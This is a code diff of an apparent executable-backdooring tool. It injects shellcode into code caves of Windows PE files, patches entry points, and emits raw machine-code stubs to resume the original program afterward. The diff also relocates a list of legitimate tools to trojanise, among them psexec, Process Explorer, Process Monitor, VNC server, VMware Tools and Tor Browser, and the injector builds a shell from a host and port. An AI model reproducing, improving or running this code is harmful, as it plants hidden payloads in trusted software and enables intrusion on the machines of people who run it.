@@ -48,6 +48,26 @@ def signal_handler(signal, frame):
         sys.exit(0)
 
 #Different Machine Types
+list_of_targets = {'hamachi-2.exe':
+                   [('hamachi-2.exe', ), "Hamachi2Svc", True],
+                   'tcpview.exe': [('tcpview.exe',), None, True],
+                   #'rpcapd.exe':
+                   #[('rpcapd.exe'), None, False],
+                   'psexec.exe': [('psexec.exe',), 'PSEXESVC.exe', False],
+                   'vncserver.exe':
+                   [('vncserver.exe', ), 'vncserver', True],
+                   # must append code cave for vmtoolsd.exe
+                   'vmtoolsd.exe':
+                   [('vmtools.exe', 'vmtoolsd.exe'), 'VMTools', True],
+                   'nc.exe': [('nc.exe', ), None, False],
+                   'Start Tor Browser.exe':
+                   [('Start Tor Browser.exe', ), None, False],
+                   'procexp.exe': [('procexp.exe',
+                                    'procexp64.exe'), None, True],
+                   'procmon.exe': [('procmon.exe',
+                                    'procmon64.exe'), None, True]
+                   }
+
 MachineTypes = {'0x0': 'AnyMachineType', '0x1d3': 'Matsushita AM33',
                 '0x8664': 'x64', '0x1c0': 'ARM LE', '0x1c4': 'ARMv7',
                 '0xebc': 'EFIByteCode', '0x14c': 'Intel x86',
@@ -133,7 +153,7 @@ nops = [0x90, 0x3690, 0x6490, 0x6590, 0x6690, 0x6790]
 #entire length.  For reconstructing an exe it doesn't matter as much what
 #the value of the instructions are as it matters first the length in bytes.
 
-jump_codes = [ int('e8', 16), int('0xeb', 16), int('0xea', 16)]
+jump_codes = [ int('0xe9', 16), int('0xeb', 16), int('0xea', 16)]
 
 op_codes = {'0x0100': 2, '0x0101': 2, '0x0102': 2, '0x0103': 2,
             '0x0104': 3, '0x0105': 6, '0x0106': 2, '0x0107': 2,
@@ -656,12 +676,6 @@ def patch_initial_instructions(fileItems, ImpList, count_bytes):
     executable entry point to jump to either the decoder or
     the shellcode if it is not encoded."""
 
-    #So, you need to patch the initial instructions
-    #to make sure everything is aligned.
-    #You are going to use 5 bytes to jump to your code
-    #cave so you need to make sure that your initial
-    #instructions are covered
-
     f.seek(fileItems['LocOfEntryinCode'])
     #print 'VirtualStartingPoint',fileItems['VirtualStartingPoint']
 
@@ -733,21 +747,44 @@ def resume_execution_32(ImpList):
 
         compliment_one, compliment_two = ones_compliment()
 
-        if OpCode in jump_codes:
+        if OpCode == int('e8', 16):  # Call instruction
             print "You might have issues running this on a x64 system."
+            print "Test it before deploying!"
+            resumeExe += struct.pack('=B', int('E8', 16))  # call
+            resumeExe += "\x00"*4
+            # POP ECX to find location
+            resumeExe += struct.pack('=B', int('59', 16))
+            # add ECX,10 push ECX
+            # Will need to build an ASM routine to beat ASLR
+            resumeExe += "\x83\xC1\x10\x51"
+            resumeExe += "\x05"
+            call_addr = (fileItems['VirtualStartingPoint'] +
+                         instruction + 5)
+            resumeExe += struct.pack('<I', call_addr)
+            resumeExe += "\xff\xe0"
+            resumeExe += "\x90"*4
+            resumeExe += "\x25"          #
+            resumeExe += compliment_one  #
+            resumeExe += "\x25"          # To zero eax
+            resumeExe += compliment_two  #
+            resumeExe += "\x05"  # ADD
+            resumeExe += struct.pack('<I', item[3])
+            resumeExe += "\x50\xc3\x90\x90"  # PUSH EAX,RETN, NOPS*4
+            ReturnTrackingAddress = item[3]
+            return ReturnTrackingAddress, resumeExe
+
+        elif OpCode in jump_codes:
             resumeExe += struct.pack('=B', int('E8', 16))  # call
             resumeExe += "\x00"*4
             # POP ECX to find location
             resumeExe += struct.pack('=B', int('59', 16))
             #add ECX,10 push ECX
-            # Will need to build an ASM routine to beat ASLR
             resumeExe += "\x83\xC1\x16\x51"
             resumeExe += "\x25"          #
             resumeExe += compliment_one  #
             resumeExe += "\x25"          # To zero eax
             resumeExe += compliment_two  #
             resumeExe += "\x05"  # ADD
-            #print ImpValue
             if OpCode is int('ea', 16):  # jmp far
                 resumeExe += struct.pack('<BBBBBB', ImpValue)
             elif ImpValue > 429467295:
@@ -756,7 +793,7 @@ def resume_execution_32(ImpList):
                 resumeExe += struct.pack('<I', ImpValue)  # Add+ EAX, CallValue
             resumeExe += "\x50\xc3\x90\x90\x90\x90"  # PUSH EAX,RETN, NOPS*4
             ReturnTrackingAddress = item[3]
-            #print 'ReturnTrackingAddress', ReturnTrackingAddress
+            return ReturnTrackingAddress, resumeExe
 
         elif instr_length == 7:
             resumeExe += opcode_return(OpCode, instr_length)
@@ -1245,7 +1282,7 @@ def do_thebackdoor(filename, backdoorfile, shellcode,
     ImpList, count_bytes = pe32_entry_instr(fileItems['VirtualStartingPoint'],
                                             fileItems)
 
-    #If you didn't find a cave, continue to create one.
+    #If no cave found, continue to create one.
     if fileItems['JMPtoCodeAddress'] is None:
         fileItems = create_code_cave(fileItems, shellcode, nsection)
         fileItems['NewCodeCave'] = True
@@ -1410,29 +1447,6 @@ def injector(suffix, change_Access, SHELL, encoder, host,
                        }
     """
     shellcode = set_shells(SHELL, port, host)
-
-    #add putty
-    #may need to include full path of dependencies to
-    # restart
-    list_of_targets = {'hamachi-2.exe':
-                       [('hamachi-2.exe', ), "Hamachi2Svc", True],
-                       'tcpview.exe': [('tcpview.exe',), None, True],
-                       #'rpcapd.exe':
-                       #[('rpcapd.exe'), None, False],
-                       'psexec.exe': [('psexec.exe',), 'PSEXESVC.exe', False],
-                       'vncserver.exe':
-                       [('vncserver.exe', ), 'vncserver', True],
-                       # must append code cave for vmtoolsd.exe
-                       'vmtoolsd.exe':
-                       [('vmtools.exe', 'vmtoolsd.exe'), 'VMTools', True],
-                       'nc.exe': [('nc.exe', ), None, False],
-                       'Start Tor Browser.exe':
-                       [('Start Tor Browser.exe', ), None, False],
-                       'procexp.exe': [('procexp.exe',
-                                        'procexp64.exe'), None, True],
-                       'procmon.exe': [('procmon.exe',
-                                        'procmon64.exe'), None, True]
-                       }
 
     os_name = os.name
     if os_name == 'nt':
